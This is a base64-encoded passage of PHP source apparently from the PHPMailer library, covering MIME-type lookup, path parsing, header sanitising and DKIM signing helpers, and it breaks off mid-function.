ZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5wcmVzZW50YXRpb25tbC50ZW1wbGF0ZScsCiAgICAgICAgICAgICdwcHN4JyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5wcmVzZW50YXRpb25tbC5zbGlkZXNob3cnLAogICAgICAgICAgICAncHB0eCcgID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQucHJlc2VudGF0aW9ubWwucHJlc2VudGF0aW9uJywKICAgICAgICAgICAgJ3NsZHgnICA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnByZXNlbnRhdGlvbm1sLnNsaWRlJywKICAgICAgICAgICAgJ2RvY3gnICA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LndvcmRwcm9jZXNzaW5nbWwuZG9jdW1lbnQnLAogICAgICAgICAgICAnZG90eCcgID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQud29yZHByb2Nlc3NpbmdtbC50ZW1wbGF0ZScsCiAgICAgICAgICAgICd4bGFtJyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5tcy1leGNlbC5hZGRpbi5tYWNyb0VuYWJsZWQuMTInLAogICAgICAgICAgICAneGxzYicgID0+ICdhcHBsaWNhdGlvbi92bmQubXMtZXhjZWwuc2hlZXQuYmluYXJ5Lm1hY3JvRW5hYmxlZC4xMicsCiAgICAgICAgICAgICdjbGFzcycgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdkbGwnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdkbXMnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdleGUnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdsaGEnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdsemgnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdwc2QnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdzZWEnICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdzbycgICAgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdvZGEnICAgPT4gJ2FwcGxpY2F0aW9uL29kYScsCiAgICAgICAgICAgICdwZGYnICAgPT4gJ2FwcGxpY2F0aW9uL3BkZicsCiAgICAgICAgICAgICdhaScgICAgPT4gJ2FwcGxpY2F0aW9uL3Bvc3RzY3JpcHQnLAogICAgICAgICAgICAnZXBzJyAgID0+ICdhcHBsaWNhdGlvbi9wb3N0c2NyaXB0JywKICAgICAgICAgICAgJ3BzJyAgICA9PiAnYXBwbGljYXRpb24vcG9zdHNjcmlwdCcsCiAgICAgICAgICAgICdzbWknICAgPT4gJ2FwcGxpY2F0aW9uL3NtaWwnLAogICAgICAgICAgICAnc21pbCcgID0+ICdhcHBsaWNhdGlvbi9zbWlsJywKICAgICAgICAgICAgJ21pZicgICA9PiAnYXBwbGljYXRpb24vdm5kLm1pZicsCiAgICAgICAgICAgICd4bHMnICAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5tcy1leGNlbCcsCiAgICAgICAgICAgICdwcHQnICAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5tcy1wb3dlcnBvaW50JywKICAgICAgICAgICAgJ3dieG1sJyA9PiAnYXBwbGljYXRpb24vdm5kLndhcC53YnhtbCcsCiAgICAgICAgICAgICd3bWxjJyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC53YXAud21sYycsCiAgICAgICAgICAgICdkY3InICAgPT4gJ2FwcGxpY2F0aW9uL3gtZGlyZWN0b3InLAogICAgICAgICAgICAnZGlyJyAgID0+ICdhcHBsaWNhdGlvbi94LWRpcmVjdG9yJywKICAgICAgICAgICAgJ2R4cicgICA9PiAnYXBwbGljYXRpb24veC1kaXJlY3RvcicsCiAgICAgICAgICAgICdkdmknICAgPT4gJ2FwcGxpY2F0aW9uL3gtZHZpJywKICAgICAgICAgICAgJ2d0YXInICA9PiAnYXBwbGljYXRpb24veC1ndGFyJywKICAgICAgICAgICAgJ3BocDMnICA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAnLAogICAgICAgICAgICAncGhwNCcgID0+ICdhcHBsaWNhdGlvbi94LWh0dHBkLXBocCcsCiAgICAgICAgICAgICdwaHAnICAgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywKICAgICAgICAgICAgJ3BodG1sJyA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAnLAogICAgICAgICAgICAncGhwcycgID0+ICdhcHBsaWNhdGlvbi94LWh0dHBkLXBocC1zb3VyY2UnLAogICAgICAgICAgICAnc3dmJyAgID0+ICdhcHBsaWNhdGlvbi94LXNob2Nrd2F2ZS1mbGFzaCcsCiAgICAgICAgICAgICdzaXQnICAgPT4gJ2FwcGxpY2F0aW9uL3gtc3R1ZmZpdCcsCiAgICAgICAgICAgICd0YXInICAgPT4gJ2FwcGxpY2F0aW9uL3gtdGFyJywKICAgICAgICAgICAgJ3RneicgICA9PiAnYXBwbGljYXRpb24veC10YXInLAogICAgICAgICAgICAneGh0JyAgID0+ICdhcHBsaWNhdGlvbi94aHRtbCt4bWwnLAogICAgICAgICAgICAneGh0bWwnID0+ICdhcHBsaWNhdGlvbi94aHRtbCt4bWwnLAogICAgICAgICAgICAnemlwJyAgID0+ICdhcHBsaWNhdGlvbi96aXAnLAogICAgICAgICAgICAnbWlkJyAgID0+ICdhdWRpby9taWRpJywKICAgICAgICAgICAgJ21pZGknICA9PiAnYXVkaW8vbWlkaScsCiAgICAgICAgICAgICdtcDInICAgPT4gJ2F1ZGlvL21wZWcnLAogICAgICAgICAgICAnbXAzJyAgID0+ICdhdWRpby9tcGVnJywKICAgICAgICAgICAgJ21wZ2EnICA9PiAnYXVkaW8vbXBlZycsCiAgICAgICAgICAgICdhaWYnICAgPT4gJ2F1ZGlvL3gtYWlmZicsCiAgICAgICAgICAgICdhaWZjJyAgPT4gJ2F1ZGlvL3gtYWlmZicsCiAgICAgICAgICAgICdhaWZmJyAgPT4gJ2F1ZGlvL3gtYWlmZicsCiAgICAgICAgICAgICdyYW0nICAgPT4gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvJywKICAgICAgICAgICAgJ3JtJyAgICA9PiAnYXVkaW8veC1wbi1yZWFsYXVkaW8nLAogICAgICAgICAgICAncnBtJyAgID0+ICdhdWRpby94LXBuLXJlYWxhdWRpby1wbHVnaW4nLAogICAgICAgICAgICAncmEnICAgID0+ICdhdWRpby94LXJlYWxhdWRpbycsCiAgICAgICAgICAgICd3YXYnICAgPT4gJ2F1ZGlvL3gtd2F2JywKICAgICAgICAgICAgJ2JtcCcgICA9PiAnaW1hZ2UvYm1wJywKICAgICAgICAgICAgJ2dpZicgICA9PiAnaW1hZ2UvZ2lmJywKICAgICAgICAgICAgJ2pwZWcnICA9PiAnaW1hZ2UvanBlZycsCiAgICAgICAgICAgICdqcGUnICAgPT4gJ2ltYWdlL2pwZWcnLAogICAgICAgICAgICAnanBnJyAgID0+ICdpbWFnZS9qcGVnJywKICAgICAgICAgICAgJ3BuZycgICA9PiAnaW1hZ2UvcG5nJywKICAgICAgICAgICAgJ3RpZmYnICA9PiAnaW1hZ2UvdGlmZicsCiAgICAgICAgICAgICd0aWYnICAgPT4gJ2ltYWdlL3RpZmYnLAogICAgICAgICAgICAnZW1sJyAgID0+ICdtZXNzYWdlL3JmYzgyMicsCiAgICAgICAgICAgICdjc3MnICAgPT4gJ3RleHQvY3NzJywKICAgICAgICAgICAgJ2h0bWwnICA9PiAndGV4dC9odG1sJywKICAgICAgICAgICAgJ2h0bScgICA9PiAndGV4dC9odG1sJywKICAgICAgICAgICAgJ3NodG1sJyA9PiAndGV4dC9odG1sJywKICAgICAgICAgICAgJ2xvZycgICA9PiAndGV4dC9wbGFpbicsCiAgICAgICAgICAgICd0ZXh0JyAgPT4gJ3RleHQvcGxhaW4nLAogICAgICAgICAgICAndHh0JyAgID0+ICd0ZXh0L3BsYWluJywKICAgICAgICAgICAgJ3J0eCcgICA9PiAndGV4dC9yaWNodGV4dCcsCiAgICAgICAgICAgICdydGYnICAgPT4gJ3RleHQvcnRmJywKICAgICAgICAgICAgJ3ZjZicgICA9PiAndGV4dC92Y2FyZCcsCiAgICAgICAgICAgICd2Y2FyZCcgPT4gJ3RleHQvdmNhcmQnLAogICAgICAgICAgICAneG1sJyAgID0+ICd0ZXh0L3htbCcsCiAgICAgICAgICAgICd4c2wnICAgPT4gJ3RleHQveG1sJywKICAgICAgICAgICAgJ21wZWcnICA9PiAndmlkZW8vbXBlZycsCiAgICAgICAgICAgICdtcGUnICAgPT4gJ3ZpZGVvL21wZWcnLAogICAgICAgICAgICAnbXBnJyAgID0+ICd2aWRlby9tcGVnJywKICAgICAgICAgICAgJ21vdicgICA9PiAndmlkZW8vcXVpY2t0aW1lJywKICAgICAgICAgICAgJ3F0JyAgICA9PiAndmlkZW8vcXVpY2t0aW1lJywKICAgICAgICAgICAgJ3J2JyAgICA9PiAndmlkZW8vdm5kLnJuLXJlYWx2aWRlbycsCiAgICAgICAgICAgICdhdmknICAgPT4gJ3ZpZGVvL3gtbXN2aWRlbycsCiAgICAgICAgICAgICdtb3ZpZScgPT4gJ3ZpZGVvL3gtc2dpLW1vdmllJwogICAgICAgICk7CiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoc3RydG9sb3dlcigkZXh0KSwgJG1pbWVzKSkgewogICAgICAgICAgICByZXR1cm4gJG1pbWVzW3N0cnRvbG93ZXIoJGV4dCldOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSc7CiAgICB9CgogICAgLyoqCiAgICAgKiBNYXAgYSBmaWxlIG5hbWUgdG8gYSBNSU1FIHR5cGUuCiAgICAgKiBEZWZhdWx0cyB0byAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywgaS5lLi4gYXJiaXRyYXJ5IGJpbmFyeSBkYXRhLgogICAgICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUgQSBmaWxlIG5hbWUgb3IgZnVsbCBwYXRoLCBkb2VzIG5vdCBuZWVkIHRvIGV4aXN0IGFzIGEgZmlsZQogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqIEBzdGF0aWMKICAgICAqLwogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBmaWxlbmFtZVRvVHlwZSgkZmlsZW5hbWUpCiAgICB7CiAgICAgICAgLy8gSW4gY2FzZSB0aGUgcGF0aCBpcyBhIFVSTCwgc3RyaXAgYW55IHF1ZXJ5IHN0cmluZyBiZWZvcmUgZ2V0dGluZyBleHRlbnNpb24KICAgICAgICAkcXBvcyA9IHN0cnBvcygkZmlsZW5hbWUsICc/Jyk7CiAgICAgICAgaWYgKGZhbHNlICE9PSAkcXBvcykgewogICAgICAgICAgICAkZmlsZW5hbWUgPSBzdWJzdHIoJGZpbGVuYW1lLCAwLCAkcXBvcyk7CiAgICAgICAgfQogICAgICAgICRwYXRoaW5mbyA9IHNlbGY6Om1iX3BhdGhpbmZvKCRmaWxlbmFtZSk7CiAgICAgICAgcmV0dXJuIHNlbGY6Ol9taW1lX3R5cGVzKCRwYXRoaW5mb1snZXh0ZW5zaW9uJ10pOwogICAgfQoKICAgIC8qKgogICAgICogTXVsdGktYnl0ZS1zYWZlIHBhdGhpbmZvIHJlcGxhY2VtZW50LgogICAgICogRHJvcC1pbiByZXBsYWNlbWVudCBmb3IgcGF0aGluZm8oKSwgYnV0IG11bHRpYnl0ZS1zYWZlLCBjcm9zcy1wbGF0Zm9ybS1zYWZlLCBvbGQtdmVyc2lvbi1zYWZlLgogICAgICogV29ya3Mgc2ltaWxhcmx5IHRvIHRoZSBvbmUgaW4gUEhQID49IDUuMi4wCiAgICAgKiBAbGluayBodHRwOi8vd3d3LnBocC5uZXQvbWFudWFsL2VuL2Z1bmN0aW9uLnBhdGhpbmZvLnBocCMxMDc0NjEKICAgICAqIEBwYXJhbSBzdHJpbmcgJHBhdGggQSBmaWxlbmFtZSBvciBwYXRoLCBkb2VzIG5vdCBuZWVkIHRvIGV4aXN0IGFzIGEgZmlsZQogICAgICogQHBhcmFtIGludGVnZXJ8c3RyaW5nICRvcHRpb25zIEVpdGhlciBhIFBBVEhJTkZPXyogY29uc3RhbnQsCiAgICAgKiAgICAgIG9yIGEgc3RyaW5nIG5hbWUgdG8gcmV0dXJuIG9ubHkgdGhlIHNwZWNpZmllZCBwaWVjZSwgYWxsb3dzICdmaWxlbmFtZScgdG8gd29yayBvbiBQSFAgPCA1LjIKICAgICAqIEByZXR1cm4gc3RyaW5nfGFycmF5CiAgICAgKiBAc3RhdGljCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gbWJfcGF0aGluZm8oJHBhdGgsICRvcHRpb25zID0gbnVsbCkKICAgIHsKICAgICAgICAkcmV0ID0gYXJyYXkoJ2Rpcm5hbWUnID0+ICcnLCAnYmFzZW5hbWUnID0+ICcnLCAnZXh0ZW5zaW9uJyA9PiAnJywgJ2ZpbGVuYW1lJyA9PiAnJyk7CiAgICAgICAgJHBhdGhpbmZvID0gYXJyYXkoKTsKICAgICAgICBpZiAocHJlZ19tYXRjaCgnJV4oLio/KVtcXFxcL10qKChbXi9cXFxcXSo/KShcLihbXlwuXFxcXC9dKz8pfCkpW1xcXFwvXC5dKiQlaW0nLCAkcGF0aCwgJHBhdGhpbmZvKSkgewogICAgICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygxLCAkcGF0aGluZm8pKSB7CiAgICAgICAgICAgICAgICAkcmV0WydkaXJuYW1lJ10gPSAkcGF0aGluZm9bMV07CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMiwgJHBhdGhpbmZvKSkgewogICAgICAgICAgICAgICAgJHJldFsnYmFzZW5hbWUnXSA9ICRwYXRoaW5mb1syXTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cyg1LCAkcGF0aGluZm8pKSB7CiAgICAgICAgICAgICAgICAkcmV0WydleHRlbnNpb24nXSA9ICRwYXRoaW5mb1s1XTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygzLCAkcGF0aGluZm8pKSB7CiAgICAgICAgICAgICAgICAkcmV0WydmaWxlbmFtZSddID0gJHBhdGhpbmZvWzNdOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHN3aXRjaCAoJG9wdGlvbnMpIHsKICAgICAgICAgICAgY2FzZSBQQVRISU5GT19ESVJOQU1FOgogICAgICAgICAgICBjYXNlICdkaXJuYW1lJzoKICAgICAgICAgICAgICAgIHJldHVybiAkcmV0WydkaXJuYW1lJ107CiAgICAgICAgICAgIGNhc2UgUEFUSElORk9fQkFTRU5BTUU6CiAgICAgICAgICAgIGNhc2UgJ2Jhc2VuYW1lJzoKICAgICAgICAgICAgICAgIHJldHVybiAkcmV0WydiYXNlbmFtZSddOwogICAgICAgICAgICBjYXNlIFBBVEhJTkZPX0VYVEVOU0lPTjoKICAgICAgICAgICAgY2FzZSAnZXh0ZW5zaW9uJzoKICAgICAgICAgICAgICAgIHJldHVybiAkcmV0WydleHRlbnNpb24nXTsKICAgICAgICAgICAgY2FzZSBQQVRISU5GT19GSUxFTkFNRToKICAgICAgICAgICAgY2FzZSAnZmlsZW5hbWUnOgogICAgICAgICAgICAgICAgcmV0dXJuICRyZXRbJ2ZpbGVuYW1lJ107CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICByZXR1cm4gJHJldDsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXQgb3IgcmVzZXQgaW5zdGFuY2UgcHJvcGVydGllcy4KICAgICAqIFlvdSBzaG91bGQgYXZvaWQgdGhpcyBmdW5jdGlvbiAtIGl0J3MgbW9yZSB2ZXJib3NlLCBsZXNzIGVmZmljaWVudCwgbW9yZSBlcnJvci1wcm9uZSBhbmQKICAgICAqIGhhcmRlciB0byBkZWJ1ZyB0aGFuIHNldHRpbmcgcHJvcGVydGllcyBkaXJlY3RseS4KICAgICAqIFVzYWdlIEV4YW1wbGU6CiAgICAgKiBgJG1haWwtPnNldCgnU01UUFNlY3VyZScsICd0bHMnKTtgCiAgICAgKiAgIGlzIHRoZSBzYW1lIGFzOgogICAgICogYCRtYWlsLT5TTVRQU2VjdXJlID0gJ3Rscyc7YAogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgVGhlIHByb3BlcnR5IG5hbWUgdG8gc2V0CiAgICAgKiBAcGFyYW0gbWl4ZWQgJHZhbHVlIFRoZSB2YWx1ZSB0byBzZXQgdGhlIHByb3BlcnR5IHRvCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqIEBUT0RPIFNob3VsZCB0aGlzIG5vdCBiZSB1c2luZyB0aGUgX19zZXQoKSBtYWdpYyBmdW5jdGlvbj8KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNldCgkbmFtZSwgJHZhbHVlID0gJycpCiAgICB7CiAgICAgICAgaWYgKHByb3BlcnR5X2V4aXN0cygkdGhpcywgJG5hbWUpKSB7CiAgICAgICAgICAgICR0aGlzLT4kbmFtZSA9ICR2YWx1ZTsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCR0aGlzLT5sYW5nKCd2YXJpYWJsZV9zZXQnKSAuICRuYW1lKTsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIFN0cmlwIG5ld2xpbmVzIHRvIHByZXZlbnQgaGVhZGVyIGluamVjdGlvbi4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZWN1cmVIZWFkZXIoJHN0cikKICAgIHsKICAgICAgICByZXR1cm4gdHJpbShzdHJfcmVwbGFjZShhcnJheSgiXHIiLCAiXG4iKSwgJycsICRzdHIpKTsKICAgIH0KCiAgICAvKioKICAgICAqIE5vcm1hbGl6ZSBsaW5lIGJyZWFrcyBpbiBhIHN0cmluZy4KICAgICAqIENvbnZlcnRzIFVOSVggTEYsIE1hYyBDUiBhbmQgV2luZG93cyBDUkxGIGxpbmUgYnJlYWtzIGludG8gYSBzaW5nbGUgbGluZSBicmVhayBmb3JtYXQuCiAgICAgKiBEZWZhdWx0cyB0byBDUkxGIChmb3IgbWVzc2FnZSBib2RpZXMpIGFuZCBwcmVzZXJ2ZXMgY29uc2VjdXRpdmUgYnJlYWtzLgogICAgICogQHBhcmFtIHN0cmluZyAkdGV4dAogICAgICogQHBhcmFtIHN0cmluZyAkYnJlYWt0eXBlIFdoYXQga2luZCBvZiBsaW5lIGJyZWFrIHRvIHVzZSwgZGVmYXVsdHMgdG8gQ1JMRgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAc3RhdGljCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gbm9ybWFsaXplQnJlYWtzKCR0ZXh0LCAkYnJlYWt0eXBlID0gIlxyXG4iKQogICAgewogICAgICAgIHJldHVybiBwcmVnX3JlcGxhY2UoJy8oXHJcbnxccnxcbikvbXMnLCAkYnJlYWt0eXBlLCAkdGV4dCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXQgdGhlIHB1YmxpYyBhbmQgcHJpdmF0ZSBrZXkgZmlsZXMgYW5kIHBhc3N3b3JkIGZvciBTL01JTUUgc2lnbmluZy4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRjZXJ0X2ZpbGVuYW1lCiAgICAgKiBAcGFyYW0gc3RyaW5nICRrZXlfZmlsZW5hbWUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGtleV9wYXNzIFBhc3N3b3JkIGZvciBwcml2YXRlIGtleQogICAgICogQHBhcmFtIHN0cmluZyAkZXh0cmFjZXJ0c19maWxlbmFtZSBPcHRpb25hbCBwYXRoIHRvIGNoYWluIGNlcnRpZmljYXRlCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzaWduKCRjZXJ0X2ZpbGVuYW1lLCAka2V5X2ZpbGVuYW1lLCAka2V5X3Bhc3MsICRleHRyYWNlcnRzX2ZpbGVuYW1lID0gJycpCiAgICB7CiAgICAgICAgJHRoaXMtPnNpZ25fY2VydF9maWxlID0gJGNlcnRfZmlsZW5hbWU7CiAgICAgICAgJHRoaXMtPnNpZ25fa2V5X2ZpbGUgPSAka2V5X2ZpbGVuYW1lOwogICAgICAgICR0aGlzLT5zaWduX2tleV9wYXNzID0gJGtleV9wYXNzOwogICAgICAgICR0aGlzLT5zaWduX2V4dHJhY2VydHNfZmlsZSA9ICRleHRyYWNlcnRzX2ZpbGVuYW1lOwogICAgfQoKICAgIC8qKgogICAgICogUXVvdGVkLVByaW50YWJsZS1lbmNvZGUgYSBES0lNIGhlYWRlci4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eHQKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX1FQKCR0eHQpCiAgICB7CiAgICAgICAgJGxpbmUgPSAnJzsKICAgICAgICBmb3IgKCRpID0gMDsgJGkgPCBzdHJsZW4oJHR4dCk7ICRpKyspIHsKICAgICAgICAgICAgJG9yZCA9IG9yZCgkdHh0WyRpXSk7CiAgICAgICAgICAgIGlmICgoKDB4MjEgPD0gJG9yZCkgJiYgKCRvcmQgPD0gMHgzQSkpIHx8ICRvcmQgPT0gMHgzQyB8fCAoKDB4M0UgPD0gJG9yZCkgJiYgKCRvcmQgPD0gMHg3RSkpKSB7CiAgICAgICAgICAgICAgICAkbGluZSAuPSAkdHh0WyRpXTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRsaW5lIC49ICc9JyAuIHNwcmludGYoJyUwMlgnLCAkb3JkKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJGxpbmU7CiAgICB9CgogICAgLyoqCiAgICAgKiBHZW5lcmF0ZSBhIERLSU0gc2lnbmF0dXJlLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJHNpZ25IZWFkZXIKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gREtJTV9TaWduKCRzaWduSGVhZGVyKQogICAgewogICAgICAgIGlmICghZGVmaW5lZCgnUEtDUzdfVEVYVCcpKSB7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXh0ZW5zaW9uX21pc3NpbmcnKSAuICdvcGVuc3NsJyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuICcnOwogICAgICAgIH0KICAgICAgICAkcHJpdktleVN0ciA9IGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5ES0lNX3ByaXZhdGUpOwogICAgICAgIGlmICgkdGhpcy0+REtJTV9wYXNzcGhyYXNlICE9ICcnKSB7CiAgICAgICAgICAgICRwcml2S2V5ID0gb3BlbnNzbF9wa2V5X2dldF9wcml2YXRlKCRwcml2S2V5U3RyLCAkdGhpcy0+REtJTV9wYXNzcGhyYXNlKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkcHJpdktleSA9ICRwcml2S2V5U3RyOwogICAgICAgIH0KICAgICAgICBpZiAob3BlbnNzbF9zaWduKCRzaWduSGVhZGVyLCAkc2lnbmF0dXJlLCAkcHJpdktleSkpIHsKICAgICAgICAgICAgcmV0dXJuIGJhc2U2NF9lbmNvZGUoJHNpZ25hdHVyZSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAnJzsKICAgIH0KCiAgICAvKioKICAgICAqIEdlbmVyYXRlIGEgREtJTSBjYW5vbmljYWxpemF0aW9uIGhlYWRlci4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzaWduSGVhZGVyIEhlYWRlcgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fSGVhZGVyQygkc2lnbkhlYWRlcikKICAgIHsKICAgICAgICAkc2lnbkhlYWRlciA9IHByZWdfcmVwbGFjZSgnL1xyXG5ccysvJywgJyAnLCAkc2lnbkhlYWRlcik7CiAgICAgICAgJGxpbmVzID0gZXhwbG9kZSgiXHJcbiIsICRzaWduSGVhZGVyKTsKICAgICAgICBmb3JlYWNoICgkbGluZXMgYXMgJGtleSA9PiAkbGluZSkgewogICAgICAgICAgICBsaXN0KCRoZWFkaW5nLCAkdmFsdWUpID0gZXhwbG9kZSgnOicsICRsaW5lLCAyKTsKICAgICAgICAgICAgJGhlYWRpbmcgPSBzdHJ0b2xvd2VyKCRoZWFkaW5nKTsKICAgICAgICAgICAgJHZhbHVlID0gcHJlZ19yZXBsYWNlKCcvXHMrLycsICcgJywgJHZhbHVlKTsgLy8gQ29tcHJlc3MgdXNlbGVzcyBzcGFjZXMKICAgICAgICAgICAgJGxpbmVzWyRrZXldID0gJGhlYWRpbmcgLiAnOicgLiB0cmltKCR2YWx1ZSk7IC8vIERvbid0IGZvcmdldCB0byByZW1vdmUgV1NQIGFyb3VuZCB0aGUgdmFsdWUKICAgICAgICB9CiAgICAgICAgJHNpZ25IZWFkZXIgPSBpbXBsb2RlKCJcclxuIiwgJGxpbmVzKTsKICAgICAgICByZXR1cm4gJHNpZ25IZWFkZXI7CiAgICB9CgogICAgLyoqCiAgICAgKiBHZW5lcmF0ZSBhIERLSU0gY2Fub25pY2FsaXphdGlvbiBib2R5LgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkgTWVzc2FnZSBCb2R5CiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gREtJTV9Cb2R5QygkYm9keSkKICAgIHsKICAgICAgICBpZiAoJGJvZHkgPT0gJycpIHsKICAgICAgICAgICAgcmV0dXJuICJcclxuIjsKICAgICAgICB9CiAgICAgICAgLy8gc3RhYmlsaXplIGxpbmUgZW5kaW5ncwogICAgICAgICRib2R5ID0gc3RyX3JlcGxhY2UoIlxyXG4iLCAiXG4iLCAkYm9keSk7CiAgICAgICAgJGJvZHkgPSBzdHJfcmVwbGFjZSgiXG4iLCAiXHJcbiIsICRib2R5KTsKICAgICAgICAvLyBFTkQgc3RhYmlsaXplIGxpbmUgZW5kaW5ncwogICAgICAgIHdoaWxlIChzdWJzdHIoJGJvZHksIHN0cmxlbigkYm9keSkgLSA0LCA0KSA9PSAiXHJcblxyXG4iKSB7CiAgICAgICAgICAgICRib2R5ID0gc3Vic3RyKCRib2R5LCAwLCBzdHJsZW4oJGJvZHkpIC0gMik7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYm9keTsKICAgIH0KCiAgICAvKioKICAgICAqIENyZWF0ZSB0aGUgREtJTSBoZWFkZXIgYW5kIGJvZHkgaW4gYSBuZXcgbWVzc2FnZSBoZWFkZXIuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkaGVhZGVyc19saW5lIEhlYWRlciBsaW5lcwogICAgICogQHBhcmFtIHN0cmluZyAkc3ViamVjdCBTdWJqZWN0CiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5IEJvZHkKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX0FkZCgkaGVhZGVyc19saW5lLCAkc3ViamVjdCwgJGJvZHkpCiAgICB7CiAgICAgICAgJERLSU1zaWduYXR1cmVUeXBlID0gJ3JzYS1zaGExJzsgLy8gU2lnbmF0dXJlICYgaGFzaCBhbGdvcml0aG1zCiAgICAgICAgJERLSU1jYW5vbmljYWxpemF0aW9uID0gJ3JlbGF4ZWQvc2ltcGxlJzsgLy8gQ2Fub25pY2FsaXphdGlvbiBvZiBoZWFkZXIvYm9keQogICAgICAgICRES0lNcXVlcnkgPSAnZG5zL3R4dCc7IC8vIFF1ZXJ